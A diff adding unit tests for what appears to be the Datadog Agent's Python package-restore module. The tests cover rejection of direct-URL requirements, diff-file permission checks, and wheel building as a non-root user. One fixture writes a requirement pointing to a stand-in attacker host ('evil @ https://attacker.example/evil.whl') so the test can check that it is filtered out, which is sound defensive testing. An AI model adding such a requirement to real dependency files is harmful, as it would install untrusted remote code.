@@ -1,6 +1,7 @@
 import unittest
 from packages import extract_version, create_python_installed_packages_file, create_diff_installed_packages_file, check_file_owner_system_windows
 from packages import run_command, install_datadog_package, install_dependency_package, install_diff_packages_file
+from packages import load_requirements, has_expected_diff_file_permissions
 from packages import IntegrationInstallError, IntegrationsRestoreError
 import packages
 import packaging.requirements
@@ -74,6 +75,51 @@ class TestPackages(unittest.TestCase):
         os.rmdir(test_directory)
 
     # ------------------------------------------------------------------ #
+    # load_requirements — direct URL references
+    # ------------------------------------------------------------------ #
+
+    def test_load_requirements_rejects_direct_url_references(self):
+        """PEP 508 direct references must be filtered out, they bypass the registry."""
+        test_directory = tempfile.mkdtemp()
+        req_file = os.path.join(test_directory, "requirements.txt")
+
+        with open(req_file, 'w', encoding='utf-8') as f:
+            f.write("package==1.0.0\n")
+            f.write("evil @ https://attacker.example/evil.whl\n")
+
+        requirements = load_requirements(req_file)
+
+        self.assertIn('package', requirements)
+        self.assertNotIn('evil', requirements)
+
+        # Cleanup
+        os.remove(req_file)
+        os.rmdir(test_directory)
+
+    # ------------------------------------------------------------------ #
+    # has_expected_diff_file_permissions
+    # ------------------------------------------------------------------ #
+
+    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
+    def test_has_expected_diff_file_permissions(self):
+        with patch('packages.os.stat') as mock_stat, patch('packages.pwd.getpwnam') as mock_getpwnam:
+            mock_getpwnam.return_value.pw_uid = 1000
+            mock_stat.return_value.st_mode = 0o100644
+
+            mock_stat.return_value.st_uid = 0
+            self.assertTrue(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))
+
+            mock_stat.return_value.st_uid = 1000
+            self.assertTrue(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))
+
+            mock_stat.return_value.st_uid = 1234
+            self.assertFalse(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))
+
+            mock_stat.return_value.st_uid = 0
+            mock_stat.return_value.st_mode = 0o100666
+            self.assertFalse(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))
+
+    # ------------------------------------------------------------------ #
     # run_command
     # ------------------------------------------------------------------ #
 
@@ -119,6 +165,35 @@ class TestPackages(unittest.TestCase):
         self.assertEqual(mock_cmd.call_count, 2)
         self.assertEqual(ctx.exception.package, 'datadog-ping==1.0.2')
         self.assertEqual(ctx.exception.returncode, 2)
+
+    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
+    def test_install_dependency_package_builds_wheels_as_dd_agent_then_installs_as_root(self):
+        """With preexec_fn set: download/build runs demoted, install runs as root."""
+        pip = [os.path.join('/opt/datadog-agent', "embedded", "bin", "pip")]
+        demote = lambda: None
+        with patch('packages.run_command', return_value=('', '', 0)) as mock_cmd, \
+             patch('packages.tempfile.mkdtemp', return_value='/tmp/wheelhouse'), \
+             patch('packages.pwd.getpwnam') as mock_pw, \
+             patch('packages.os.chown') as mock_chown, \
+             patch('packages.shutil.rmtree') as mock_rmtree:
+            mock_pw.return_value.pw_uid = 1000
+            mock_pw.return_value.pw_gid = 1000
+            install_dependency_package(pip, 'pynvml==11.5.3', preexec_fn=demote)
+
+        self.assertEqual(mock_cmd.call_count, 2)
+        download_args = mock_cmd.call_args_list[0].args
+        install_args = mock_cmd.call_args_list[1].args
+        self.assertEqual(
+            download_args[0],
+            pip + ['wheel', '--wheel-dir', '/tmp/wheelhouse', '--no-cache-dir', 'pynvml==11.5.3']
+        )
+        self.assertIs(download_args[1], demote)
+        self.assertEqual(
+            install_args[0],
+            pip + ['install', '--no-index', '--find-links', '/tmp/wheelhouse', 'pynvml==11.5.3']
+        )
+        self.assertEqual(len(install_args), 1)
+        mock_rmtree.assert_called_once_with('/tmp/wheelhouse', ignore_errors=True)
 
     # ------------------------------------------------------------------ #
     # install_diff_packages_file — error collection
